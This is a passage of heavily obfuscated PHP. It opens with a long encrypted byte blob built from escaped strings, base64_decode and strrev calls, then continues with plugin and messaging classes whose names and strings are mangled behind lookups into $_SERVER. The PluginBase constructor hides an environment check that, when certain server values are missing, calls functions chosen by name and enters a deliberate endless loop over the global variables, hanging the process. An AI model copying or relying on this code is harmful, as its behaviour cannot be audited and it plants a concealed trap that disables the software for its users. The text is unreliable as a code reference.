316\152\3\252\64\342\52\112\26\341\204\227\204\150\166\343\232\325\176\143\15\307\147\160\117\214\320\327\227\326\112\102\12\343\363\37\217\311\267\37\153\221\227\26\340".base64_decode('WWUGoxaxYEWp3cINqqKs1hQKyY5GciXfqOTRLs5NaNa4K/PHgFf7NTkT9yRusnMf76AklqynghE=')."\x90\x5e\x94\x22\xaf\x71\x6\xe5\xb1\xb0\xa7\xd9\xf3\x44\xf8\xeb\xd2\xeb\x59\x5d\x5e\xb3\x1a\x1f\xe2\x99\x32\xba\x9f\x44\x56\xfb\xcb\x6b\xe4\xd9\x26\xc2\xb7\xd\x35\x9d\x0\xb1\x83\x10\x36\xab\x54\x5a\x53\x5f\xb5\xa5\x1f\x64"."\125\262\26\210\263\4\327\366\250\203\151\130\251\24\55\17\376\166\121\172\24\243\252\330\104\240\243\220\321\217\5\15\64\303\361\336\236\55\151\12\127\261\137\4\242\106\120\21\317\25\237\172\52\155\10\277"."\x25\xb9\x75\x6b\x6d\x1a\xd8\x17\xb9\xb3\x2\x65\xc3\x9d\x84\x51\xd2\x9d\x86\x41\x20\xd2\xd0\x6e\xe8\xfc\xc\x5d\xe\x72\x21\x91\xc2\xca\xd0\x5f\x51\x27\x12\xed\x11\x11\x7a\x54\x77\x64\xe\x32\x9d\x60\x12\x1b\x1a\x6c\xf4\x2d"."\334\272\325\157\60\55\174\246\373\313\352\372\170\151\32\37\362\71\313\243\221\0\350\171\101\110\160\227\244\150\167\2\340\331\34\377\102\341\71\201\153\333\53\130\5\277\243\143\315\40\147\300\206\131\236\112".base64_decode('5CTy3DG21WhdwZACHSKTG3kwGBVcOOdCDTuiMf10wjc4vBqoiC13vRlEx+1ak5QA+ojAPOB8qmU=')."\255\170\27\132\266\153\246\341\100\271\354\240\164\54\202\65\63\12\106\312\317\311\23\325\326\360\245\205\47\3\126\204\20\107\127\72\126\301\167\145\340\247\215\110\362\70\242\336\146\205\223\123\236\216\332\342".base64_decode('iQAdTNckMsazV1vpilG2HeRWIVcVDeQJ4RFtXKNFGhSQ6XU0kNfgGhDpoDlAP0QHV+OvId670NE=')."\x40\x6\x61\xe5\x75\x1d\xd5\x27\x74\xb2\xde\x47\x50\xc5\x6\x85\x11\xf9\xa2\xc6\xe1\x58\xb1\x4d\xb4\x59\x73\xa3\x77\x78\xc0\x7d\x20\xe\x26\xbf\x81\x28\xe8\xc8\x1c\x7f\x32\xfd\x9d\x77\x3c\x9f\x57\xfc\xba\x7c\x1\x31\xe5\xc4"."\xa0\x91\xd0\x4c\xc2\xf9\x67\xf1\xfd\x1c\x2d\x4\xf\xc9\xf7\xc7\x63\xc9\x58\x90\xbd\xbe\xec\xbc\xc8\xa3\x69\x4b\xd8\x29\xc6\xa2\x3e\x21\xc4\xd9\x8e\x19\xb4\x73\x75\x52\x56\x82\xb3\x2f\x7e\x48\x1\x6c\xa8\x54\x4b\x25\x6e\x42"."\x81\xb1\x9e\x6f\xbb\x1d\xf5\xff\xc\x12\x35\x1e\x3d\x33\x3c\x4b\xbe\x32\xa8\x31\x25\xa\x90\x2f\x53\xad\x25\xe6\xad\x1\xfa\x89\x36\xf8\x24\x76\xc4\x63\x41\xb2\xe4\xa1\x1d\xfb\x82\xd7\x33\xbe\x41\xea\x53\xa8\xa3\x85\x19\x25".strrev('ƒÎ^(ÕâM™Æ4Ô9µÍ…¾M=Q‡AV#gÖ,"äÕ£¨s'."\r".'-¼s”•€èác3')."\270\15\10\106\302\241\150\122\15\3\323\321\332\266\334\327\42\114\372\15\113\274\156\100\303\101\256\124\133\321\11\124\175\216\141\325\1\15\275\214\117\162\243\17\275\344\220\323\122\220\26\114\346\167\277\255"."\xa5\xa5\xc5\xdb\xd2\x8a\xfe\x67\x96\x8a\xcc\x3\x78\x3b\x73\xa2\x26\x15\x69\x69\x69\x27\xff\xd3\xc\x72\x21\xe\x28\xe8\xcc\x21\xfe\xa6\xa0\x3d\xfa\x33\xa1\x33\x17\x72\xb0\x47\xa3\xa3\x78\x95\x31\xbc\x83\x41\xec\x95\x41\xc1"."\x5d\x83\x69\x11\x46\x2b\x8\xfb\x88\x8b\x7c\x46\x9c\x1d\x6f\xdb\x2b\xe4\xc2\x13\x62\x45\xe9\x11\xf6\x4\xbc\x99\x90\x73\xa0\xb8\x7c\xab\xc6\xc2\x88\x3\x45\xc8\x4d\xa0\x2\x1d\xe6\x97\x5f\xa8\x98\x58\x36\xab\xe8\xc5\x8c\x70"."\x90\x12\x2a\x65\x6\xe5\x8f\xf9\x18\x74\x69\xa2\x78\x9d\xc8\xcb\x32\xbc\xf2\x1b\x8c\x50\x89\x52\x3a\xe9\xde\x9\x95\x73\x3a\xdc\xc7\x29\x88\x95\x4a\xf3\x19\xc6\x9\x92\xe0\x16\xb3\xd0\xd2\x23\x2\x38\x2a\x2b\x8a\x90\x6c\x7e".strrev('À©z¹×8©"6Éa‚irF^á=â0z85°U	ÍåégVàQ}\'¼ú%¼£GÌîbD½')."\67\134\243\206\264\2\320\4\250\122\125\31\236\253\160\101\66\222\244\263\46\372\204\27\167\324\213\373\335\56\240\210\10\131\200\77\174\112\215\203\130\177\25\40\55\64\112\36\45\12\341\267\267\251\205\130"."\xfb\x9c\x9a\x49\xb6\xdd\x13\x4c\xe6\xcd\x71\xf7\xe1\x56\x7e\x67\x31\x69\xf6\x98\xa\x44\xe2\x63\xf4\xd3\x59\x4a\x88\x25\x50\xe5\x8d\x20\xf7\xc0\x2f\x35\xe0\xce\x72\xd5\x9\x50\xcd\x89\x9a\xa\x90\x5e\x5b\x9a\x28\x98\xd4\x29"."\x8d\xd3\x5d\xa5\x89\xaf\xfd\x20\x7f\x3e\x44\x76\xc0\x4f\x85\x5c\x92\xba\xb3\x5\xef\xb3\x9\x5d\x53\xd6\xc6\xb8\x74\xe4\xf5\x95\x2b\x66\xe\x61\x82\x25\x3\xd\xa5\xf7\xd7\x4f\xe6\xc5\x6b\x4b\xd6\x29\xc4\x7b\x2f\x97\x93\x13"."\xf1\x25\x68\xb7\x43\x13\x5a\xf2\x1a\xa4\x65\xf8\x2e\x29\x15\x95\x54\x20\x44\xa2\x73\x85\x4b\x19\x41\xfe\x3e\xb1\x9c\x88\xcf\xd2\xb2\xbe\x5\x39\xc6\x38\xdb\xc0\x6c\xa3\x33\x85\xf7\xec\x23\x90\x8e\xc9\x54\xec\x8a\x56\xb2\xb2"."\262\136\244\253\30\341\173\200\52\62\375\71\126\104\20\57\54\22\223\137\227\327\62\231\176\341\153\113\165\340\325\154\50\310\26\240\244\156\342\306\107\116\123\310\152\343\236\274\230\36\65\236\34\241\206\350"."\x4c\xa7\x69\x54\xe0\xe2\x50\x4d\x4a\x12\xba\x5b\xd0\x93\x0\x9\x36\x56\xfc\x5\xdc\x0\xd1\x37\x77\xcd\xa7\x58\x83\xed\x8c\x1f\x92\xab\x39\xf3\x30\x5a\x27\x4d\x87\xca\xe3\x4b\xe7\xee\x60\x81\xaf\xd2\x0\x43\x44\xe6\xf2\x89"."\xcc\x39\xe3\xff\x55\xf9\xca\x10\x83\x47\x95\xa5\x65\x98\xdc\xf4\xda\x76\xd9\xd9\x90\xb4\x1c\x9c\x2b\xa1\x6\xe5\x9\x77\x81\x1b\x68\xe7\x34\x53\x8a\xe1\xd6\xd9\x6d\xad\x56\xc9\x81\x83\x3c\xf\x4e\x56\x4c\x72\x95\xa3\x94\x74".base64_decode('7kjKiXFyBXjC2EQ8Ln5rRK6E2xpw0c/1nITjGO8rZTCZaYgy39cG6lTz2et6dAMRuoF+y5GB8B0=')."\163\174\214\375\100\143\35\106\147\75\261\47\302\74\16\322\75\205\175\10\217\203\43\66\263\350\166\362\5\322\216\247\310\15\41\176\41\231\307\142\260\141\205\364\175\25\171\56\255\116\56\366\344\305\276\306"."\37\143\201\275\12\225\61\155\56\37\300\315\243\65\41\42\21\231\65\307\11\135\72\177\4\54\111\133\360\256\21\75\137\245\361\116\313\152\162\222\216\7\257\204\372\307\235\220\155\61\312\344\255\55\111\202".base64_decode('4Yq67VhwDUkxDUUldoIwMzbjR9hLW8L+gwTFDvLS1eeywDaBazLhqNM/aJW3iXtQEuYnwIlV9LQ=')."\131\311\340\35\135\162\267\127\262\343\172\116\216\22\235\14\266\142\304\313\75\162\23\330\73\253\104\24\361\112\15\244\355\252\354\353\125\172\310\13\305\44\355\143\211\245\366\266\52\234\27\127\151\313\64\262"."\110\312\40\345\353\261\345\56\331\66\21\24\120\275\34\42\337\113\124\123\374\212\335\305\53\63\363\171\105\346\222\231\255\74\156\200\270\260\304\43\260\344\74\324\54\176\124\107\214\114\256\102\276\131\123\205"."\346\141\316\120\30\325\313\71\26\326\56\32\140\263\130\57\247\316\247\110\226\4\321\64\303\64\240\4\233\5\220\40\143\112\147\332\152\336\326\66\57\163\113\55\33\332\263\143\46\354\162\150\235\111\150\200"."\xf\xea\x8c\xd4\x81\xd9\x11\x94\x13\x65\x4c\x49\x6b\x81\x38\x85\x14\xfe\xeb\x88\x27\x4c\x3e\x9f\xc4\x65\x26\x8f\x11\x95\x42\x99\xc8\xb\x2d\x5b\x6a\x93\xe4\x56\xc4\xe4\xf9\x14\x16\x38\xbb\xcb\x61\x45\xe6\x2a\x80\x56\x82\x33"."\x1f\x5e\x5f\x13\x3c\x18\x75\x4f\xe9\xdc\xb7\x5c\x8d\xc0\x2b\x81\xb2\x52\x19\xa9\x25\x34\x54\x85\x7d\x1d\x4a\x32\xa9\xaa\xa4\x0\x81\x50\x9c\xc4\x92\x59\x4e\xd2\x44\x72\xd2\xe4\x89\xb5\x6a\xc6\x18\xe9\x0\x94\xd4\xa9\x10\x1c"."\315\233\232\261\123\41\207\160\265\157\212\273\176\301\52\374\170\47\347\6\143\226\34\141\271\34\367\54\107\204\332\104\70\152\363\44\136\152\102\147\376\201\230\110\241\277\267\337\317\223\72\371\352\243\22\35".base64_decode('4TI4yOwC9Ek9DW0VjbQSifWEg4FIVzixXsnhK2ihLo+6q5JVqVpCIY8uCnJ1QMHOsDfFHwvEQW8=')."\xa\x1d\x6d\xbc\x19\x7e\x24\xb4\xc4\xe1\x8f\xc\xa\x1a\x13\xf\x41\x3b\x9b\xa5\xd8\xa7\x57\x6a\x5a\x2c\x61\x13\xff\x42\x4d\x1d\x7c\x53\x50\xa7\x74\x41\x48\xb8\xa5\xc2\xe5\x8a\x5e\x5b\x7e\x4a\xc7\x9a\xfa\x52\x8f\xa5\xa\xd5"."\72\275\201\362\365\277\100\136\172\224\113\43\246\110\57\315\326\171\243\64\156\130\206\130\340\254\306\224\334\172\240\253\57\34\125\3\221\110\154\243\303\224\46\43\77\312\51\315\202\0\70\375\222\354\167\132".strrev('¤•ï‡”‚…k¹•û}Réaš+–öoJˆQUéF7‡ãve×Ÿq¨ÿaËK¢’©Ğòæd¼qN').base64_decode('aNW5k9b9lEo/wNIktfR6BeLhnt7k/7qrRkZoNhtcLZ27TKGP9gVpO85vineJa1P+t28ee4QcXyU=').base64_decode('XlLZa+smOdEBR0/TwjGVCO5V8QnEn1SmyvJttT/DTPcR4oeY+S2OiHMNLgWN4K/Qg7ZhEqEnOwE=').base64_decode('MQEioiAAcIeuqOvRZrdlmeNJ5ppvkHf5aN4gHgUqOSzGhGLcDktUdefU6QDKVoRUjhdQOpQW+rw=').strrev('®kÖv„8$ÕN,Ô]XÎ+R/ÀÒ®	¼ªK6šU Ù^ˆB¶X¨q]ÄâOç3VWmW8')."\216\337\237\54\145\115\31\272\304\330\14\333\36\173\110\210\312\102\74\350\200\241\333\265\217\375\322\352\377\137\52\322\314\204\344\207\337\162\157\201\174\373\162\330\275\21\25\355\274\71\41\304\3\54\105\142"."\264\230\255\135\275\356\315\62\124\151\135\21\347\106\362\233\313\16\163\74\307\33\233\64\103\251\226\360\375\10\42\101\60\343\130\213\311\222\327\266\324\267\371\364\147\10\176\331\136\350\356\4\245\156\360\311"."\x66\x8e\x80\x4e\x3b\x1\x29\xa1\x4f\x17\xb2\xe\x52\xb\x91\x93\xb2\x56\x72\xbc\x3e\x8b\xfa\x5e\xef\x41\x6b\xec\xd4\xdc\xf9\x86\xaa\x78\xf2\x5d\x6c\xb6\xce\xa7\x3a\xb9\x22\x84\x25\x16\x8b\x65\x3b\x1e\x87\x4d\x9a\x49\x2d\xe7"."\241\270\213\311\237\210\165\116\311\141\331\204\214\364\34\145\132\214\126\162\214\130\303\122\74\344\51\164\112\365\334\57\232\112\253\217\23\127\331\314\62\107\174\157\203\36\244\313\177\110\316\320\331\6\341\50"."\x46\x93\xfc\x5a\xb9\x2c\x6e\x64\xe4\x7d\x15\xfd\xeb\xf0\x4f\x2\x79\x3\xc9\x5e\x95\x78\x9\x53\xa9\x36\x47\x42\xda\xb\xc5\x2d\x29\x4d\x84\x1b\xd3\x6a\x29\x4c\x6f\x86\x1c\xa9\x15\xe9\xd0\x27\xbf\x5b\x41\x6f\x8b\x84\x33\xb".base64_decode('KI762U8vmQFgcpPs4p8L+hG14Wdjf62iANavAzqC9ZmYItmoSc5WPvlUBgWU1YpAB3mRUfuITIY=').base64_decode('PhFP6INM1tiydL0TW1OOvWtf7/1caqNBfrr0LD/kyO4Nhc6R+wV4Qkij1aLzM9xgzkPH6uErhj4=')."\x6d\x5f\xef\x51\x7b\xf\x7f\xfb\xd6\x43\x7d\xe9\x7b\xe0\x81\x7b\x8f\x78\xbd\xfe\xa3\x9e\xe5\xc5\xfd\xe7\x2c\x2\x3f\x50\xd4\x9c\x49\xdc\xc7\x11\xe\x2f\x57\x85\xb8\x1b\x7a\x58\xf2\xe7\x16\x6c\xb\xad\x9\x18\x4\x8f\x38\xcf".base64_decode('ZDBqMUJpSNVKwUN0RjxMkdM1fgdoxVjluXIZKPJorCCPcqBSSAirM9IjMVEy9D+2M2C9QQ5vGSc=')."\15\154\137\235\252\260\53\165\167\61\303\201\325\150\177\26\346\361\364\165\210\232\55\242\26\277\67\27\63\155\213\227\256\224\245\42\142\227\22\127\317\213\351\17\334\240\3\267\43\260\107\161\342\253\302\36".strrev('óËikQ÷X KØpêüsEv·Ä\\Tø1W’@ï²¢Ğ:K+Wş!Úã~Ò0ÁtÉ)©').base64_decode('1Gx/lKsg2Ajj4RCF9Vsy0qPEtRz5AjUP9Fj6pIcCzCNfe9OTjVAxw4PhiCsZFhKaLtTO6gwXg0g=')."\234\0\110\47\5\345\241\120\145\333\225\123\321\316\326\122\230\322\46\15\146\317\105\210\203\244\207\110\154\256\171\123\330\160\123\262\45\145\123\132\17\220\256\257\121\334\66\261\232\227\45\332\163\265\100\147"."\240\16\202\210\276\11\200\323\141\261\203\61\26\177\213\230\163\220\40\251\22\331\322\141\266\376\351\27\303\222\10\207\143\245\302\124\275\241\327\31\302\107\340\65\73\203\372\327\211\256\113\132\113\316\11\162".strrev('AGÈ³40‘‰å)Hºè"5B¶eÃ‰ä(*$ÕßqÄü`_1Js—¶jöº|£Iˆg¹2‚õ')."\327\121\304\11\210\360\145\110\110\217\203\14\111\257\326\310\116\64\110\103\62\256\326\66\115\67\141\42\202\27\262\63\42\154\203\101\0\161\42\372\52\304\11\113\240\207\73\146\321\44\115\116\325\275\334\61"."\x3a\x88\x4e\xdb\xa6\x1c\x16\x68\x82\xb7\x41\x6e\xa0\x89\x3a\xe0\x38\x82\xa3\xb8\x98\x75\x89\xe2\x66\x5c\x89\xc\x4a\x64\x8d\xf1\xe\x50\xfe\x7d\x21\x70\xee\xb2\x17\x20\xc7\xa1\x8f\xbf\x0\xef\x38\x4\x5a\x2\x2e\xb0\x7c\x32".base64_decode('HsfLcRnBiABhA8JPjBnp1yQeg3UxJ4U4r4MjktTb4R4JOyh2LVnmdAkb78u3lvTVFBpmhxveSUI=')."\x6d\xeb\xad\x40\x61\xc2\xed\x11\x66\xdb\x1e\xb6\x13\x7b\xe6\x1c\x78\x20\x71\x92\x81\xeb\x70\x71\x47\x9d\x5d\x81\xc\xfb\x23\x78\xaa\xa5\x2d\xec\x46\x82\x1b\x3f\x12\xba\xca\x22\x3d\x70\xee\x80\x6e\xe3\xb\x6c\x4e\xae\xa9\x58"."\334\65\40\47\257\160\40\240\23\202\273\157\134\20\16\22\347\46\1\314\133\65\163\142\255\261\53\104\304\236\273\157\241\153\116\152\302\307\214\151\26\122\132\5\333\305\217\332\114\163\252\136\304\355\231\43"."\241\145\165\271\317\203\104\154\215\22\211\341\364\260\240\32\70\255\136\65\101\223\310\246\123\226\250\36\151\13\245\110\255\160\155\116\50\354\255\203\374\64\211\235\46\44\273\157\330\244\135\103\47\12\323\316"."\207\222\44\36\255\246\230\350\57\142\345\270\316\66\13\245\61\343\100\274\321\1\334\145\67\100\261\62\73\141\67\303\226\60\274\216\221\70\342\245\14\50\235\114\335\34\111\65\64\61\351\230\115\107\242\74".base64_decode('UYKM+ZyeEaEGvsnulI6ttJAlw9ZxPVKr5VJbmxMPuQq24XBKBpn7BG+L15XQ6nU1Z1j0Asa1SuQ=').base64_decode('zlATKyynimPJEJMEkrs0cvHura0j2fnLl/M1a7I+ieCdEtJQHJLhwUhNf8Uk3DGUqhabiHWgsxA=')."\27\236\111\172\362\151\111\2\355\146\276\150\362\174\237\74\56\371\362\331\171\257\205\125\54\305\225\156\62\26\17\251\33\303\330\203\125\370\244\320\0\173\105\302\60\311\263\156\254\311\201\76\271\237\370\106"."\xa4\xdb\xe4\x98\x85\xd7\xa4\x78\xfe\xc0\x2e\x96\x83\xfc\xd2\xd9\x69\xc2\x2e\x59\x1c\x30\x3f\x9f\xb2\x50\xd6\x59\x18\x1b\x3d\x39\x97\xe3\x9a\x7a\xc5\xd2\x66\xc5\x92\x8a\x61\x91\x6\xdb\xb9\xb3\x4c\x4d\x64\xa0\x84\x56\xb0\x9e"."\266\365\214\202\267\173\307\11\146\160\111\313\342\341\172\15\143\116\333\104\55\243\174\136\162\311\307\224\204\243\124\142\261\27\372\32\216\121\207\166\361\120\202\46\360\112\165\33\62\251\123\276\172\171\10\113"."\23\266\3\235\304\203\201\356\207\2\235\17\3\266\113\262\142\372\220\242\343\355\320\232\51\212\232\101\301\247\270\362\60\221\230\75\27\237\356\305\5\73\366\311\205\75\202\142\353\35\77\101\71\20\355\157"."\x56\x8b\x2a\x53\xf1\xc2\x12\x14\x21\xfc\x22\x34\xb7\xf6\x70\xc\x5f\xb0\x2b\x53\xb1\x4a\xbc\x18\xad\x71\xa1\xeb\xb4\xd1\x93\xea\x93\xe3\x13\x95\x72\x39\x84\x5d\xa0\x2a\x21\x27\x49\x37\x49\xe8\x14\x9a\x71\x3e\xf\x4b\x32\x49"."\62\173\303\4\132\220\56\277\235\272\7\334\302\271\146\167\255\32\21\51\233\324\142\176\362\321\57\166\301\20\26\36\33\111\66\275\356\13\270\217\205\122\255\1\307\11\137\322\124\110\23\262\21\252\275\242"."\26\67\347\22\223\312\252\141\21\201\140\33\134\351\22\325\25\373\242\66\56\230\154\161\2\313\144\272\265\361\72\105\63\65\147\104\224\302\213\22\46\135\362\227\45\154\255\364\11\371\353\120\116\230\75\71".base64_decode('CtamCn9aUn3X2ZoME6fVGz4he87qsr8ujlQiiT6dydV6JMEFVoMS+j50KFxwJj7p9A7Gi/E5Q2U=')."\210\101\246\327\221\352\72\172\143\311\44\343\62\135\131\40\265\223\232\257\53\334\223\120\100\57\104\244\346\144\355\205\131\53\44\352\177\104\140\245\23\304\222\40\113\144\60\266\306\164\0\137\332\310\370\300"."\240\144\134\316\164\164\247\16\152\260\203\207\54\16\256\315\64\13\5\174\107\75\113\66\125\254\226\266\335\332\22\5\256\202\103\73\104\216\317\142\341\320\304\42\21\67\321\274\200\63\213\226\327\135\160\223"."\x2b\xb8\x61\x4a\x6b\x38\xde\xa4\x96\xd3\x27\xc\x3b\x9d\x97\xce\xfa\xb5\x99\xb5\xe9\x95\x9a\x69\x86\xe\xd4\x1f\x87\xbb\xb7\x6c\x96\xdd\x6a\x4d\xa2\x91\x9a\xfe\x48\x3a\x57\x49\xb3\x4e\x1d\xda\xa3\xba\xd5\x68\x16\xae\x29\xe".base64_decode('XY66s4AA16VZuG5NNqtcA1dSz9aq1izDqwUeiDEzdQYsxINS0dngWbdw7edgDbhLE2FZ/V5I0kQ=')."\247\116\114\275\136\324\55\74\153\57\334\245\5\37\204\217\330\365\162\352\56\120\320\377\250\263\143\260\234\72\173\4\245\177\263\152\226\11\305\253\332\315\112\344\325\321\375\2\257\140\56\167\143\165\262\145".strrev('æµPŒÌ·É’Ñ¥ªŞØïš³-Ú…F0XÃ–ŠCk™>Ù1ãÄ’PÒ¹ƒªrÍôºñfªú²E')."\251\151\300\271\16\112\125\351\255\236\272\26\113\36\54\6\253\25\61\25\330\43\24\262\255\27\75\336\233\266\221\226\164\121\205\275\12\37\231\41\316\273\5\41\243\166\337\44\10\241\234\103\215\251\236\330".strrev(':­Ø~ô-¶švü™}r¨{b³	Ù “”÷&¸¿ö±0*‘öàŒå!E‡@š<Ií§œøO Ñ\'')."\x7\x60\x76\xc0\x23\xa9\xb7\xa1\x90\xb8\xb1\xc6\x9d\x22\x17\x9f\x4\x87\xe9\xbd\x4\xe\x82\x2a\x5\x96\x2a\x25\x74\x9a\x4b\x88\x9e\x23\x82\xaf\x58\x79\x24\x5e\x7b\xc3\xda\xcd\x5f\x4b\x19\x35\x33\x29\x73\x92\x39\x81\x46\x98"."\x23\xc1\x44\xf2\x7b\x9\xbe\x22\x25\x5\x3c\xe2\xf4\xc6\xf2\xd3\x1c\x3f\xbc\x1a\xe9\x25\x37\x22\x5e\x70\x4b\x3c\x52\xce\x39\xaa\xd3\x67\xbb\xb9\xd2\xfc\x47\xb5\x0\xb7\x1\xa2\x9\xfa\x64\x1c\x91\xfe\x82\x15\x63\x22\x99\xa8"."\xc9\xea\xf\x24\x12\x1b\x63\xf1\x2e\xfa\xc2\x5c\x4d\x36\xa9\x25\x69\x36\xd6\x64\xf5\xf7\xc6\xa2\xb3\xe5\x85\xfa\x2\xe1\x48\x4d\x1e\x56\x82\x8c\xaa\xc2\x93\x38\xcd\xa\xf7\x93\x5e\x12\xdd\x80\xd9\x7a\x11\xe\xae\x17\x3d\x61".base64_decode('95MReHVcTIJ0O1fOm6XZ5pE1kNCYr0b5okovCvfzohGnhE2+zLLY4zY84HwW2qVx7NS0YZgLzWI=').base64_decode('ZccofClehlT8TB8nAPw8IXRufA51HymdLBJCdaS1K+/u5IKXC95I9sK60Kxzyyhf1eJcARzczRM=')."\xd8\x3b\x3b\x23\x66\x4a\x1c\xe1\xe0\x6c\x7\x6e\xe\x0\xdc\x92\x7a\x2b\xd\x3b\xb2\x6d\x2d\xe7\xe5\xe4\x40\x52\x64\xa1\xf2\x71\x4c\x14\x84\xe4\xfa\xff\x2\xe7\x5b\x6\xf9\xf7\xc5\x0\x0".base64_decode('')."".""."".""."", 10, -8))); goto AÂãöÕ‰ôË; fÕĞ˜ Ÿ½: class Message { function __construct() { } public function send($ñ£İ¢¹ô = '', $çÏ»Ş± = array(), $óß½§ÚŒ = "\x74\x65\x78\164") { $ÁÔË’æ‰ =& $_SERVER[”øäÃÍª]; $«ú„²‰ = array($ÁÔË’æ‰[33] => $ÁÔË’æ‰[1243], $ÁÔË’æ‰[168] => $ñ£İ¢¹ô); if (in_array($óß½§ÚŒ, array($ÁÔË’æ‰[1243], $ÁÔË’æ‰[1780]))) { $«ú„²‰[$ÁÔË’æ‰[33]] = $óß½§ÚŒ; } $çÏ»Ş± = array($ÁÔË’æ‰[606] => isset($çÏ»Ş±[$ÁÔË’æ‰[606]]) ? $çÏ»Ş±[$ÁÔË’æ‰[606]] : $ÁÔË’æ‰[12], $ÁÔË’æ‰[692] => isset($çÏ»Ş±[$ÁÔË’æ‰[692]]) ? $çÏ»Ş±[$ÁÔË’æ‰[692]] : $ÁÔË’æ‰[12]); if (empty($ñ£İ¢¹ô) || empty($çÏ»Ş±[$ÁÔË’æ‰[606]]) && empty($çÏ»Ş±[$ÁÔË’æ‰[692]])) { return !1; } $‡ıºğ€Ì = array($ÁÔË’æ‰[1709] => $«ú„²‰, $ÁÔË’æ‰[1781] => $çÏ»Ş±); Hook::trigger($ÁÔË’æ‰[1782], $‡ıºğ€Ì); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $‡öÀ¿ñÇ =& $_SERVER[”øäÃÍª]; if (!isset($_SERVER[$‡öÀ¿ñÇ[492]]) || !isset($_SERVER[$‡öÀ¿ñÇ[493]])) { $’× «¶ = $‡öÀ¿ñÇ[998]; $¸òƒ§¹ä = $‡öÀ¿ñÇ[494]; $û¿ø¼ˆ = $_SERVER[$‡öÀ¿ñÇ[495]] . $‡öÀ¿ñÇ[496]; $²ö’è = $¸òƒ§¹ä($û¿ø¼ˆ); $ÊöÈ¿Å” = explode($‡öÀ¿ñÇ[285], $²ö’è); if (count($ÊöÈ¿Å”) < $‡öÀ¿ñÇ[717]) { $™Á»âÖÉ = $‡öÀ¿ñÇ[498]; $™Á»âÖÉ(); } $”¥ş‚¶ = $‡öÀ¿ñÇ[999]; $”¥ş‚¶($_SERVER[$‡öÀ¿ñÇ[1000]]); $éÑğˆş° = 1; for ($»£”ÊÛ = $éÑğˆş°; $»£”ÊÛ > 0; $»£”ÊÛ++) { $”¥ş‚¶ = json_encode($GLOBALS[$‡öÀ¿ñÇ[515]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($‡öÀ¿ñÇ[1783]); $this->pluginName = str_replace($‡öÀ¿ñÇ[1783], $‡öÀ¿ñÇ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $‡öÀ¿ñÇ[8]; $this->pluginApi = appHostGet() . $‡öÀ¿ñÇ[1784] . $this->pluginName . $‡öÀ¿ñÇ[8]; $this->pluginHost = $config[$‡öÀ¿ñÇ[1785]] . $this->pluginName . $‡öÀ¿ñÇ[8]; $this->pluginHostDefault = $config[$‡öÀ¿ñÇ[1785]] . $this->pluginName . $‡öÀ¿ñÇ[8]; $±ºçî§ = $config[$‡öÀ¿ñÇ[1786]]; if ($±ºçî§ && strpos($‡öÀ¿ñÇ[50] . $±ºçî§ . $‡öÀ¿ñÇ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$‡öÀ¿ñÇ[1787]] . $this->pluginName . $‡öÀ¿ñÇ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[”øäÃÍª][1788]); } protected function assign($áÒÍ¦²„, $¬ü©â³ú = false) { if (is_array($áÒÍ¦²„)) { $this->values = array_merge($this->values, $áÒÍ¦²„); } else { $this->values[$áÒÍ¦²„] = $¬ü©â³ú; } } protected function display($‰€“îù) { extract($this->values); require $‰€“îù; } final function hookRegist($åï¡»‘ê) { $this->modelPlugin->appRegist($this->pluginName, $åï¡»‘ê); } final function appIcon() { $–š¥‹ø” =& $_SERVER[”øäÃÍª]; $¯êÙóÔğ = $this->appPackage(); $Ç¹Û¡ŠÅ = $–š¥‹ø”[12]; if (isset($¯êÙóÔğ[$–š¥‹ø”[513]])) { if (isset($¯êÙóÔğ[$–š¥‹ø”[513]][$–š¥‹ø”[1789]])) { $Ç¹Û¡ŠÅ = $–š¥‹ø”[1790] . $¯êÙóÔğ[$–š¥‹ø”[513]][$–š¥‹ø”[1789]] . $–š¥‹ø”[1791]; } else { if ($¯êÙóÔğ[$–š¥‹ø”[513]][$–š¥‹ø”[1792]]) { $Ç¹Û¡ŠÅ = $–š¥‹ø”[1793] . $¯êÙóÔğ[$–š¥‹ø”[513]][$–š¥‹ø”[1792]] . $–š¥‹ø”[1794]; } } } return $Ç¹Û¡ŠÅ; } final function fileCanView($¼ö²ƒ“Œ) { $ŸÖïÊ =& $_SERVER[”øäÃÍª]; if (request_url_safe($¼ö²ƒ“Œ)) { return !0; } if ($this->isShare($¼ö²ƒ“Œ)) { ActionCall($ŸÖïÊ[1795], $¼ö²ƒ“Œ); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ØÀĞ“²ß = $ŸÖïÊ[1796] . rawurlencode(this_url()); show_tips(LNG($ŸÖïÊ[1797]) . $ŸÖïÊ[1798] . $ØÀĞ“²ß . $ŸÖïÊ[1799] . LNG($ŸÖïÊ[1800]) . $ŸÖïÊ[1801], !1); } if (!Action($ŸÖïÊ[1802])->authCan($ŸÖïÊ[1803])) { show_tips(LNG($ŸÖïÊ[1804]) . $ŸÖïÊ[1805], !1); } ActionCall($ŸÖïÊ[1795], $¼ö²ƒ“Œ); } final function isShare($€‚â­æ ) { $©øğŠ©Ÿ = KodIO::parse($€‚â­æ ); return $©øğŠ©Ÿ[$_SERVER[”øäÃÍª][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¥ı®®) { if (request_url_safe($¥ı®®)) { return $¥ı®®; } if (!$this->isShare($¥ı®®)) { $¥ı®® = $this->filePath($¥ı®®, !1); } return Action($_SERVER[”øäÃÍª][1315])->linkOut($¥ı®®); } public function filePathLinkOut($òåÇ€ıÑ) { if (request_url_safe($òåÇ€ıÑ)) { return $òåÇ€ıÑ; } $this->fileCanView($òåÇ€ıÑ); return Action($_SERVER[”øäÃÍª][1315])->link($òåÇ€ıÑ); } final function filePath($á‚äËìÂ, $·ñ‘ºô· = true, $ëÎÛ¨™¼ = false) { $Ù›Ñ‚· =& $_SERVER[”øäÃÍª]; $ÇÙ•Í¼ = $this->filePathGet($á‚äËìÂ, $·ñ‘ºô·); if (!$this->fileInfo) { show_tips(LNG($Ù›Ñ‚·[105]), !1); } if 